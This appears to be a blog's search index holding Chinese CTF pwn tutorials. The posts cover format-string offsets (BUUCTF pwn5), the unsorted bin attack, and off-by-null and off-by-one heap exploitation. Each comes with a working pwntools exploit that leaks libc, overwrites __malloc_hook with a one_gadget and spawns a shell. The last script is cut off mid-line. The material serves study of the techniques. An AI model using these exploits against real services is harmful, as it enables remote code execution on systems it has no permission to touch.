<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>格式化字符串漏洞偏移的便捷算法</title>
      <link href="/2023/03/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%81%8F%E7%A7%BB%E7%9A%84%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/"/>
      <url>/2023/03/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%81%8F%E7%A7%BB%E7%9A%84%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="pwntools自带的偏移函数算法"><a href="#pwntools自带的偏移函数算法" class="headerlink" title="pwntools自带的偏移函数算法"></a>pwntools自带的偏移函数算法</h2><hr><ul><li>这里以buuctf上的第五空间pwn5作为演示给出一个新的计算方法，可以说是十分便捷，但也不是万能的，应该可以应付大部分题目！</li></ul><hr><h3 id="第五空间：pwn5"><a href="#第五空间：pwn5" class="headerlink" title="第五空间：pwn5"></a>第五空间：pwn5</h3><p><img src="/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%81%8F%E7%A7%BB%E7%9A%84%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/1.png"><br>这里的漏洞十分明显，就是格式化字符串漏洞，它首先会打开一个靶机上的一个随机变化的文件，从中读取4个字节到程序，后来要输入一样的数才能绕过判断，因此这里思路就是控制输入的地址数据为我们自己的，就可以绕过if判断，获得shell。这里给出一个pwntools自带的函数：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exec_fmt</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span><span class="token punctuation">:</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>      <span class="token comment">#这里的文件名为程序文件，自己更改</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>      <span class="token comment">#这个pad不用管它输入了什么</span><span class="token keyword">return</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>fmt <span class="token operator">=</span> FmtStr<span class="token punctuation">(</span>exec_fmt<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"offset ===> "</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span>offset<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就可以直接获得偏移量。<br>直接上exp：下面这个fmtstr_payload也是pwntools自带的函数，具体看我的这篇<a href="https://airunfive.github.io/2023/01/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/">博客文章</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26184</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exec_fmt</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span><span class="token punctuation">:</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>pad<span class="token punctuation">)</span><span class="token keyword">return</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>fmt <span class="token operator">=</span> FmtStr<span class="token punctuation">(</span>exec_fmt<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"offset ===> "</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span>offset<span class="token punctuation">)</span>payload<span class="token operator">=</span>fmtstr_payload<span class="token punctuation">(</span>fmt<span class="token punctuation">.</span>offset<span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">0x804C044</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your name:'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your passwd:"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后获得的界面是这样的：<br><img src="/images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%81%8F%E7%A7%BB%E7%9A%84%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/2.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unsortbin-attach</title>
      <link href="/2023/03/12/unsortbin-attach/"/>
      <url>/2023/03/12/unsortbin-attach/</url>
      
        <content type="html"><![CDATA[<h2 id="unsortbin-attach攻击原理"><a href="#unsortbin-attach攻击原理" class="headerlink" title="unsortbin-attach攻击原理"></a>unsortbin-attach攻击原理</h2><hr><p>这篇博客当初不想写的，当初不太理解，但后面好像挺常用到的还是记录一下。同时这也是时隔一个月的博客更新，恢复下进度，同时庆祝熬过了艰难的考试周。</p><hr><p>这里再次看看unsortbin的结构：<br><img src="/images/unsortbin-attach/1.png"><br>堆漏洞利用中第二常用的攻击手法。最简单的攻击手法，<strong>前提条件是UAF</strong>。任意内存地址写一个<strong>不确定</strong>的非常大的数（libc地址）。通常，我们利用unsortedbin attack来修改一些类似于<strong>修改次数限制、上限信息、伪造堆头、配合局部写</strong>等等，十分好用。</p><hr><p>unsortbin的链入链出的顺序和其他bin不一样，它是先进先出的，<strong>从头插入，从尾取出</strong>：<br><img src="/images/unsortbin-attach/2.jpg"></p><hr><p>我们要修改unsortedbin中的BK字段为target addr - 0x10（不是0x18，因为指向的是size段，这张图没画出来），当取出victim时会发生一下步骤：<br><img src="/images/unsortbin-attach/4.png"><br>fake chunk的fd、bk指针会指向unsortbin_chunks(av)的地址，这里就泄露了libc的某处地址<br>如下图是变化的全过程：<br><img src="/images/unsortbin-attach/3.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆漏洞offbynull</title>
      <link href="/2023/01/31/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbynull/"/>
      <url>/2023/01/31/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbynull/</url>
      
        <content type="html"><![CDATA[<h1 id="堆漏洞offbynull"><a href="#堆漏洞offbynull" class="headerlink" title="堆漏洞offbynull"></a>堆漏洞offbynull</h1><hr><ul><li>offbynull是offbyone的特殊情形，溢出的字节不能被我们所控制，只能溢出一个\x00，但是依然是可以利用的。现实中更为常见，因为字符串截断会在末尾加个空字符，如果边界检查不严格，就会出现offbynull。offbynull比起常规的offbyone利用方式稍微复杂一些，但是归究其本质，都是构造一个UAF供我们使用。<br>由于溢出字节只能是\x00，所以思路通常是改变其prev inuse位，通过合并构造overlap，然后构造UAF。</li></ul><hr><h2 id="0x01-offbynull原理讲解"><a href="#0x01-offbynull原理讲解" class="headerlink" title="0x01 offbynull原理讲解"></a>0x01 offbynull原理讲解</h2><hr><p>假设此时有四个0x100的堆块A、B、C、D：<br><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbynull/1.png"><br>我们在B中输入 ‘A’*0x90 + p64(0x200) + ‘\x00’，此时的内存布局如下：<br><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbynull/2.png"><br>可以看到c的previnuse位被改成了0，也就是说，程序会将B看作已经被释放的堆块，但实际它并没有被释放。在这里，我们将其改成了0x200,也就是说定位到了A堆块。但是A堆块明明没有被free，这时候我们如果free C会出现异常。我们需要做的就是骗系统，绕过检查，其实我们需要做的仅仅就是先将A free掉<br>放入unsortedbin，这时候再free C，就会触发合并操作。触发合并操作后，ABC会被看作一个大小为0x300的堆块放入unsortedbin中。然而实际上，B并没有被free，我们也就通过这样的方式构造了overlap。然后后续的操作也就和offbyone一样，通过overlap构造uaf，进而完成利用。<br><strong>在实际运用时，不局限都是0x100的，可以是中间的某个堆块是fast chunk也行，但是第一个在头的必须得是unsorted chunk大小的堆块，否则无法触发合并。</strong></p><h2 id="0x02-offbynull例题解析"><a href="#0x02-offbynull例题解析" class="headerlink" title="0x02 offbynull例题解析"></a>0x02 offbynull例题解析</h2><hr><p>环境：本地 Ubuntu16.04<br>例题：<a href="/download/offbynull">offbynull</a></p><hr><p>这里要特别说明，这题有点奇怪，如果用3个堆块进行构造overlap就会在free报错（不晓得为什么），但是用四个堆块就没问题，并且相对于前面的博客来看这里unsortbin释放后的fd指针指向的位置不是main_arena+88也很奇怪，可能是例题问题吧，可以自己调试看看。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./offbynull'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">p</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'4:delete'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span> <span class="token comment">#用于泄露libc地址</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>  add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>  <span class="token comment">#4往上合并到1</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>  <span class="token comment">#防止和topchunk合并</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x3c4b00</span> <span class="token comment">#unsortbin fd指针改变位置了，可以调试一下，libc基地址一般都是以000结尾</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>malloc<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>realloc<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span>fake_chunk<span class="token operator">=</span>malloc<span class="token operator">-</span><span class="token number">0x23</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x4527a</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>realloc<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x270</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#重新申请过3，因为漏洞出现在add，如果在上面就这样申请，会发现不会成功get shell</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#先释放1，否则报错</span>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment">#1~4放入unsortbin</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">#将chunk 2放入fastbin</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x160</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#申请的堆块从unsortbin切割0x160，正好切割到chunk 2</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">,</span><span class="token string">'0x10'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbynull/3.png"><br>结束</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆漏洞offbyone</title>
      <link href="/2023/01/30/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbyone/"/>
      <url>/2023/01/30/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbyone/</url>
      
        <content type="html"><![CDATA[<h1 id="堆漏洞offbyone"><a href="#堆漏洞offbyone" class="headerlink" title="堆漏洞offbyone"></a>堆漏洞offbyone</h1><hr><ul><li>offbyeone：一个简单又比较实用的漏洞，是在堆溢出只能溢出一个字节的时候使用。</li></ul><hr><h2 id="0x01-offbyone原理分析"><a href="#0x01-offbyone原理分析" class="headerlink" title="0x01 offbyone原理分析"></a>0x01 offbyone原理分析</h2><p><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbyone/1.png"><br>假如题目存在offbyone漏洞，堆中有ABCD四个已经被分配的大小为0x70的chunk，现在都是使用状态。然后A是我们进行offbyone的chunk，我们目的是将B的size改掉。我们在chunk A中输入我们输入**’A’*0x68 + ‘\xe1’**将左图改为右图，可以看到B的size被改大了，正好覆盖到了C的末尾。<br><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbyone/2.png"><br>这时候我们将Cfree掉，他会进入fastbin。我们再将B free掉，B+C这一段区域会进入unsorted bin。我们再次申请一个大小为0xd0的堆块，也就是说B+C这段内存又被我们控制了，此时我们就可以控制C的fd字段，就可以进行fastbinattack了。</p><hr><h2 id="0x02-offbyone例题讲解"><a href="#0x02-offbyone例题讲解" class="headerlink" title="0x02 offbyone例题讲解"></a>0x02 offbyone例题讲解</h2><hr><p>环境：本地 Ubuntu16.04<br>例题：<a href="/download/offbyone">offbyone</a></p><hr><h3 id="（1）原理补充："><a href="#（1）原理补充：" class="headerlink" title="（1）原理补充："></a>（1）原理补充：</h3><hr><p>这里用到了realloc的打法，是在给的4个onegadget都失效的情况下使用具体看这篇<a href="www.cnblogs.com/hetianlab/p/13884739.html">文章</a></p><h3 id="（2）漏洞点："><a href="#（2）漏洞点：" class="headerlink" title="（2）漏洞点："></a>（2）漏洞点：</h3><p><img src="/images/%E5%A0%86%E6%BC%8F%E6%B4%9Eoffbyone/3.png"><br>这里因为strlen函数读到0才会停止，而程序是以小端序存放<strong>（高字节在右边，低字节在左边）</strong>所以会多读一个“size”（1个字节）</p><h3 id="（3）exp"><a href="#（3）exp" class="headerlink" title="（3）exp"></a>（3）exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./offbyone'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">p</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'4:delete'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment">#这里填充0x68个a覆盖0，等下才能读入0x68个字节</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x3c4b78</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'libc_base:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>malloc<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>realloc<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span>fake_chunk<span class="token operator">=</span>malloc<span class="token operator">-</span><span class="token number">0x23</span>one_gadget<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x4527a</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span><span class="token string">'\xe1'</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>   <span class="token comment">#realloc在malloc的前面</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>realloc<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 